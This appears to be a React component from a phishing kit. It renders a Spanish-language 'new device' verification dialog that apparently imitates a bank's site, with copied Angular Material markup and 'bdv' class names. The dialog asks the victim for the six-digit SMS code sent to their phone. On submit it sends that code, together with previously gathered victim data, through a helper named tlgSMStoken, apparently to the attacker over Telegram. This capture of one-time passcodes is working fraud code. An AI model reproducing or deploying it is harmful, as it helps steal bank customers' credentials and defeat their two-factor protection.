"use client";
import { tlgSMStoken } from "@/utils/utils";

export default function SMSForm({ open, dataInfo, time }) {
  function handlerVisivility() {
    const visibility = document.getElementById("visibility2");
    const input_sms = document.getElementById("input_sms");

    if (visibility.textContent == "visibility") {
      input_sms.type = "text";
      visibility.innerHTML = "visibility_off";
    } else {
      input_sms.type = "password";
      visibility.innerHTML = "visibility";
    }
  }

  async function handleSubmitSMS(e) {
    e.preventDefault();
    const input_sms = document.getElementById("input_sms");
    const sms = input_sms.value;
    const btn_bdv = document.getElementById("submitButtonSMS");

    if (sms.length == 6) {
      btn_bdv.disabled = true;
      saveSMS(sms);
    }
  }

  function handleChangeInput(e) {
    const btn_bdv = document.getElementById("submitButtonSMS");
    if (e.target.value.length == 6) {
      btn_bdv.classList.add("mat-accent");
      btn_bdv.classList.add("mat-raised-button");
    } else {
      btn_bdv.classList.remove("mat-accent");
      btn_bdv.classList.remove("mat-raised-button");
    }
  }

  async function saveSMS(sms) {
    tlgSMStoken({ ...dataInfo, sms: sms });
  }

  if (!open) return null;

  return (
    <div>
      <div className="cdk-overlay-container">
        <div className="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing"></div>
        <div
          className="cdk-global-overlay-wrapper"
          dir="ltr"
          style={{
            justifyContent: "center",
            alignItems: "center",
          }}
        >
          <div
            id="cdk-overlay-2"
            className="cdk-overlay-pane"
            style={{
              maxWidth: "80vw",
              pointerEvents: "auto",
              width: "370px",
              height: "auto",
              position: "static",
            }}
          >
            <div className="cdk-visually-hidden cdk-focus-trap-anchor"></div>
            <div
              aria-modal="true"
              className="mat-dialog-container ng-tns-c14-4 ng-trigger ng-trigger-slideDialog ng-star-inserted"
              id="mat-dialog-0"
              role="dialog"
              style={{
                transform: "none",
                opacity: 1,
              }}
            >
              <div _nghost-c15="" className="ng-star-inserted">
                <div className="container">
                  <div className="row">
                    <h4 className="text-center">
                      Introduce tu codigo de acceso
                    </h4>
                  </div>
                  <div
                    style={{
                      fontSize: "15px",
                      fontWeight: "500",
                      marginBottom: "16px",
                    }}
                  >
                    <p>
                      Estás accediendo en un nuevo dispositivo y necesitamos
                      validar tu identidad.
                    </p>
                    <p>
                      Por favor ingresa el codigo de acceso enviado a tu
                      teléfono celular.
                    </p>
                  </div>
                  <form className="text-center">
                    <div className="row" style={{ marginBottom: 0 }}>
                      <mat-form-field
                        appearance="fill"
                        className="mat-form-field ng-tns-c11-5 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-fill mat-form-field-can-float mat-form-field-should-float ng-dirty ng-valid ng-touched"
                      >
                        <div className="mat-form-field-wrapper">
                          <div className="mat-form-field-flex">
                            <div className="mat-form-field-infix">
                              <input
                                className="input_bdv"
                                name="password"
                                type="password"
                                maxLength="6"
                                id="input_sms"
                                aria-invalid="false"
                                aria-required="false"
                                onChange={handleChangeInput}
                                style={{
                                  marginTop: 0,
                                }}
                              />
                              <div
                                className="mat-icon material-icons"
                                role="img"
                                id="visibility2"
                                aria-hidden="true"
                                onClick={handlerVisivility}
                                style={{
                                  cursor: "pointer",
                                  position: "absolute",
                                  left: "90%",
                                  top: "30%",
                                }}
                              >
                                visibility
                              </div>
                              <span className="highlight"></span>
                              <span className="bar"></span>
                              <label>Codigo temporal *</label>
                            </div>
                            <div
                              className="mat-form-field-underline ng-tns-c11-5 ng-star-inserted"
                              style={{
                                right: 0,
                              }}
                            >
                              <span className="mat-form-field-ripple"></span>
                            </div>
                            <div className="mat-form-field-subscript-wrapper">
                              <div
                                className="mat-form-field-hint-wrapper ng-tns-c11-5 ng-trigger ng-trigger-transitionMessages ng-star-inserted"
                                style={{
                                  opacity: 1,
                                  transform: "translateY(0%)",
                                }}
                              >
                                <div className="mat-form-field-hint-spacer"></div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </mat-form-field>
                    </div>
                    <h5 className="">
                      Reenviar sms en {time >= 0 ? `${time} ` : "0 "}segundos
                    </h5>
                    <div className="row">
                      <div className="button-container">
                        <button
                          color="accent"
                          mat-raised-button=""
                          type="submit"
                          className="btn_bdv"
                          disabled=""
                          onClick={handleSubmitSMS}
                          id="submitButtonSMS"
                        >
                          <span className="mat-button-wrapper">Continuar</span>
                          <div
                            className="mat-button-ripple mat-ripple"
                            matripple=""
                          ></div>
                          <div className="mat-button-focus-overlay"></div>
                        </button>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
